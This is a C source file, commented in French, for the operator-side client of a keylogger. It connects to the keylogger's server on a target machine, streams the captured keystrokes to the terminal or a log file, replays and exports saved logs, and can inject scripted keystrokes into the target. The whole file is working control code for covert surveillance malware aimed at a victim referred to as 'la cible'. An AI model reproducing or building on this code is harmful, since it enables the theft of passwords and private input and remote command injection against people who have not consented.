/***********************************************************************
* FILENAME :  main.c
*
* DESCRIPTION :
*       Ce code permet de communiquer avec le keylogger en se connectant
*       au serveur demarrer par le keylogger. Il est aussi possible de
*       recuperer les touches que la cible appuie. Il est possible
*       d'afficher les touches sur le terminal mais aussi de les sauvegarder
*       dans un fichier pour logger ce que la cible a fait sur sont clavier.
*
* AUTHOR :    Yanis GENY          START DATE :    20 Jan 2024
************************************************************************/

#include <signal.h>
#include <stdlib.h>
#include <stdlib.h>
#include <time.h>

#include "libs/headers/parser.h"
#include "libs/headers/server_interact.h"
#include "libs/headers/file_io.h"

#include "libs/headers/colors.h"
#include "libs/headers/returns.h"

extern struct parser_t parser;
extern struct server_interact_t server;

void signal_stoppe_exec(int code);
void close_files_and_network(void);

int main(int argc, char **argv) {
	int func_ret;

	/*
	*  Pour utiliser ce programme il faut donner des parametres lors du
	*  lancement de l'executable. Recuperation des differents parametre
	*  et affichage du man si -h, ou manque de parametre detecte
	*/
	func_ret = search_parser(argc, argv);
	if ((parser.parser & PARSER_FLAG_HELP) == PARSER_FLAG_HELP ) {
		parser_man(func_ret);
		return func_ret;
	}

	/*
	*  Si le flag de replay est active dans le parser, rejouer le fichier de
	*  sauvegarde des touches
	*/
	if ((parser.parser & PARSER_FLAG_REPLAY) == PARSER_FLAG_REPLAY) {
		if (open_replay_file() != _SUCCESS_) {
			printf("%sLors de l'ouverture du fichier de replay\n", NOK);
			return _ERROR_OPEN_REPLAY_FILE_;
		}
		printf("%sLors de l'ouverture du fichier de replay\n", OK);
		func_ret = replay_saved_file(); // rejoue le fichier
		if (func_ret != _SUCCESS_)
			printf("%sFail durant la lecture du fichier de replay\n", NOK);
		closed_files(); // ferme les fichier ouvert
		return _SUCCESS_;
	}

	/*
	*  Si le flag d'exportation de fichier est active, exporter le contenue
	*  du fichier de sauvegarde en fichier texte
	*/
	if ((parser.parser & PARSER_FLAG_EXPORT) == PARSER_FLAG_EXPORT) {
		if (open_export_file() != _SUCCESS_) {
			printf("%sLors de l'ouverture du fichier d'exportation : %s%s%s\n", NOK, YELLOW, parser.exp, DEFAULT_COLOR);
			return _ERROR_OPEN_REPLAY_FILE_;
		}
		printf("%sLors de l'ouverture du fichier d'exportation : %s%s%s\n", OK, YELLOW, parser.exp, DEFAULT_COLOR);
		if (open_export_file_txt() != _SUCCESS_) {
			printf("%sLors de l'ouverture du fichier d'exportation destination : %s%s.txt%s\n", NOK, YELLOW, parser.exp, DEFAULT_COLOR);
			closed_files();
			return _ERROR_OPEN_REPLAY_FILE_;
		}
		printf("%sLors de l'ouverture du fichier d'exportation destination : %s%s.txt%s\n", OK, YELLOW, parser.exp, DEFAULT_COLOR);
		
		// ecrire le resultat dans le fichier
		func_ret = write_export_file_to_text();
		if (func_ret != _SUCCESS_)
			printf("%sLors de l'exportation du fichier de sauvegarde\n", NOK);
		else
			printf("%sLors de l'exportation du fichier de sauvegarde\n", OK);

		closed_files();
		return func_ret;
	}

	/*
	*  Si le flag de convertion est active, il faut convertir le fichier en speudokeylog
	*  en keylog, definie dans le fichier speudokeylog.md
	*/
	if ((parser.parser & PARSER_FLAG_CONVERT) == PARSER_FLAG_CONVERT) {
		if (open_file_convert_speudokeylog() != _SUCCESS_) {
			printf("%sLors de l'ouverture du fichier a convertion : %s%s%s\n", NOK, YELLOW, parser.convert, DEFAULT_COLOR);
			return _ERROR_OPEN_CONVERT_FILE_;
		}
		printf("%sLors de l'ouverture du fichier a convertir : %s%s%s\n", OK, YELLOW, parser.convert, DEFAULT_COLOR);
		if (open_files_convert_keylog() != _SUCCESS_) {
			printf("%sLors de l'ouverture du fichier destination de la convertion : %s%s.keylog%s\n", NOK, YELLOW, parser.convert, DEFAULT_COLOR);
			closed_files();
			return _ERROR_OPEN_CONVERT_FILE_;
		}
		printf("%sLors de l'ouverture du fichier destination de la convertion : %s%s.keylog%s\n", OK, YELLOW, parser.convert, DEFAULT_COLOR);
		
		func_ret = convert_speudokeylog_to_keylog();
		if (func_ret != _SUCCESS_)
			printf("%s**ERROR**%s Compilation erreur a la ligne %d\n", RED, DEFAULT_COLOR, func_ret);

		closed_files();
		return _SUCCESS_;
	}

	// si les flag de replay, export, convert ne sont pas utilise et que
	// pas de target ni de port afficher le man
	if ((parser.parser & PARSER_FLAG_TARGET) != PARSER_FLAG_TARGET ||
		(parser.parser & PARSER_FLAG_PORT) != PARSER_FLAG_PORT        ) {
		parser_man(func_ret);
		return func_ret;
	}

	/*
	*  Ouverture des fichiers si les flags sont active. En cas
	*  d'erreur de l'ouverture, stopper l'execution
	*
	*  pas d'ouverture de fichier de sortie si une injection est
	*  en cours
	*/
	if ((parser.parser & PARSER_FLAG_INTPUT) != PARSER_FLAG_INTPUT) {
		func_ret = open_file_output(); // ouverture d'un fichier de sortie
		if (func_ret != _SUCCESS_) {
			printf("%sLors de l'ouverture du fichier de sortie ", NOK);
			if ((parser.parser & PARSER_FLAG_OUTPUT) == PARSER_FLAG_OUTPUT)
				printf("%s%s%s\n", YELLOW, parser.output, DEFAULT_COLOR);
			else printf("%s%s%s\n", YELLOW, DEFAULT_FILE, DEFAULT_COLOR);
			return func_ret;
		} else {
			printf("%sOuverture du fichier de log des touches : ", OK);
			if ((parser.parser & PARSER_FLAG_OUTPUT) == PARSER_FLAG_OUTPUT)
				printf("%s%s%s\n", YELLOW, parser.output, DEFAULT_COLOR);
			else printf("%s%s%s\n", YELLOW, DEFAULT_FILE, DEFAULT_COLOR);
		}
	}

	/*
	*  Ouverture de la connection avec le serveur. Stopper l'execution
	*  en cas d'erreur
	*/
	func_ret = init_server_connection();
	if (func_ret != _SUCCESS_) {
		printf("%sConnection au serveur\n", NOK);
		close_files_and_network();
		return func_ret;
	} else {
		printf("%sConnection au serveur\n", OK);
	}

	/*
	*  Mise en place d'un gestionnaire pour ctrl+c SIGINT pour stopper la
	*  connection au serveur et fermer les fichier si ils sont ouvert
	*  pour quitter le programme sans 
	*/
	signal(SIGINT, &signal_stoppe_exec);

	/*
	*  Injection des touches vert la cible en cas de declanchement du
	*  flag PARSER_FLAG_INTPUT
	*/
	if ((parser.parser & PARSER_FLAG_INTPUT) == PARSER_FLAG_INTPUT) {
		func_ret = open_input_file();
		if (func_ret != _SUCCESS_) {
			printf("%sLors de l'ouverture du fichier input : %s%s%s\n", NOK, YELLOW, parser.input, DEFAULT_COLOR);
			close_files_and_network();
			return func_ret;
		}
		printf("%sLors de l'ouverture du fichier input : %s%s%s\n", OK, YELLOW, parser.input, DEFAULT_COLOR);

		func_ret = send_input_data_at_keylogger();
		if (func_ret != _SUCCESS_) printf("%sLors de la transmition des touches au serveur keylogger\n", NOK);
		else printf("%sLors de la transmition des touches au serveur keylogger\n", OK);

		close_files_and_network();
		return _SUCCESS_;
	}

	/*
	*  Boucle d'execution pour recuperer les touches du keylogger et
	*  enregistrer dans le fichier si le flag est actif, et afficher
	*  sur le terminal si le flag est active.
	*/
	while(1) {
		func_ret = read_keys();
		if(func_ret != _SUCCESS_) {
			printf("%s***ERROR when reading char from server\nClosing execution%s\n", RED, DEFAULT_COLOR);
			close_files_and_network();
			return func_ret;
		}
		
		// affichage sur le terminal si option verbose active
		if ((parser.parser & PARSER_FLAG_VERBOSE) == PARSER_FLAG_VERBOSE)
			show_key_on_terminal(server.buffer, 0);

		// sauvegarder la touche dans le fichier de sortie
		write_key_outfile(server.buffer);
	}

	return _SUCCESS_;
}

void signal_stoppe_exec(int code) {
	printf("\n%sSignal d'arret intercepter%s: erret du prcessucce\n", RED, DEFAULT_COLOR);

	close_files_and_network();

	// stopper l'execution
	exit(_SUCCESS_);
}

void close_files_and_network(void) {
	// fermer les fichier ouvert
	closed_files();

	// fermer le connection au server
	if (server.sockfd > 0) {
		if (close_server_connection() == _SUCCESS_)
			printf("%sdeconnection au serveur\n", OK);
		else
			printf("%sdeconnection au serveur\n", NOK);
	}
}